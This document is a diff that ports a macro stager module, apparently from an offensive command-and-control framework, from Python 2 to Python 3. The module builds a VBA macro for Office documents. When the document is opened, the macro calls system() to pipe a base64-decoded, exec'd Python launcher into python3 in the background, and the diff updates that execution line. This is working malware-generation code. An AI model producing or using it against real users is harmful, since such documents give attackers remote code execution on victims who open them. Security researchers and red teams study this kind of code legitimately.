@@ -1,7 +1,11 @@
+from __future__ import print_function
+from builtins import str
+from builtins import range
+from builtins import object
 from lib.common import helpers
 import re
 
-class Stager:
+class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -70,7 +74,7 @@ class Stager:
             str1 = ''
             str2 = ''
             str1 = varstr + ' = "' + instr[:54] + '"'
-            for i in xrange(54, len(instr), 48):
+            for i in range(54, len(instr), 48):
                 holder.append('\t\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
                 str2 = '"\r\n'.join(holder)
             str2 = str2 + "\""
@@ -93,7 +97,7 @@ class Stager:
         pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
 
         if pylauncher == "":
-            print helpers.color("[!] Error in python launcher command generation.")
+            print(helpers.color("[!] Error in python launcher command generation."))
             return ""
 
         # render python launcher into python payload
@@ -125,8 +129,8 @@ class Stager:
                             Dim result As Long
                             Dim cmd As String
                             %s
-                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &")
-                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &")
+                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
+                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
                     #End If
         End Function""" %(payload)
             elif version == "new":
@@ -149,8 +153,8 @@ class Stager:
                             Dim result As LongPtr
                             Dim cmd As String
                             %s
-                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &")
-                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &", "r")
+                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
+                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &", "r")
                     #End If
         End Function""" % (payload)
             else:
